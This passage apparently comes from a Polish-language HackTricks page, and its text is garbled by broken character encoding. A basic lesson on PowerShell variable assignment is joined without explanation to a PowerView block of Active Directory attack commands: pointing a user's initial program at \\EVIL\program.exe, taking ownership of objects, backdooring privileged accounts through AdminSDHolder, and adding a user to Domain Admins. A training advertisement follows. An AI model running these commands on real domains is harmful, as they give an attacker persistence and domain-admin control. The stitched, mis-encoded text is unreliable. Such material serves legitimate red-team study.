```
#### Ustawianie wartoci

To ustawienie wartoci w PowerShell mo偶na wykona za pomoc operatora przypisania (=). Na przykad, aby przypisa warto 5 do zmiennej $x, u偶yjemy poni偶szego polecenia:

```powershell
$x = 5
```

Mo偶emy r贸wnie偶 przypisa warto do zmiennej na podstawie wyniku innego polecenia. Na przykad, jeli chcemy przypisa warto 10 do zmiennej $y na podstawie wyniku polecenia Get-Process, mo偶emy u偶y poni偶szego polecenia:

```powershell
$y = (Get-Process).Count
```

Wartoci mo偶na r贸wnie偶 przypisa do waciwoci obiekt贸w. Na przykad, jeli chcemy przypisa warto "admin" do waciwoci "Username" obiektu $user, mo偶emy u偶y poni偶szego polecenia:

```powershell
$user.Username = "admin"
```

Ustawienie wartoci w PowerShell jest podstawowym narzdziem, kt贸re pozwala nam manipulowa danymi i wykonywa r贸偶ne operacje.
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy swoj **firm reklamowan w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
